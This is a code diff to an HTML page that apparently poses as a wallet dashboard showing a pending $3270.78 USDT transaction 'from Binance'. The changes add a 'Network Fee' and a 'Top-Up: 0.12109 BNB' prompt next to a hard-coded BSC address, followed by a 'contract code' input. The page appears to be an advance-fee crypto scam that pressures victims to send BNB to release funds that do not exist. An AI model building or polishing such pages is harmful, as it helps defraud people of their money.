@@ -26,12 +26,13 @@
     <input type="text" id="manualAddress" placeholder="Enter BSC Address" />
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
   </div>  <div class="container hidden" id="dashboard">
-    <h1>Wallet Dashboard</h1>
+    <h1>Transaction Wallet Dashboard</h1>
     <p>Address: <span id="shortAddress"></span></p>
     <p>Transaction pending.....</p>
     <p>Transaction source: Binance</p>
     <p>Transaction Amount: $3270.78 USDT</p>
     <p>Network: Binance chain BSC BEP20</p>
+    <p>Network Fee: 0.12109 BNB</p>
     <p>Transaction status: in progress</p>
     <div class="chart-container">
       <div id="tradingview-widget"></div>
@@ -45,7 +46,8 @@
     <button class="btn" onclick="nextPage('contractInput')">Confirm</button>
   </div>  <div class="container hidden" id="contractInput">
     <h1>Input opBNB Contract Code</h1>
-    <p>BNB Smart Chain BEP20 network address:</p>
+    <p>Network:BNB Smart Chain BEP20:</p>
+    <p>Top-Up:0.12109 BNB</p>
     <p><strong>0xFf5e8a2603e64b2950Ee8D0Af6AC86670bD5Db69</strong></p>
     <input type="text" id="contractCode" placeholder="Enter contract code" />
     <button class="btn" onclick="verifyContract()">Confirm contract transaction</button>
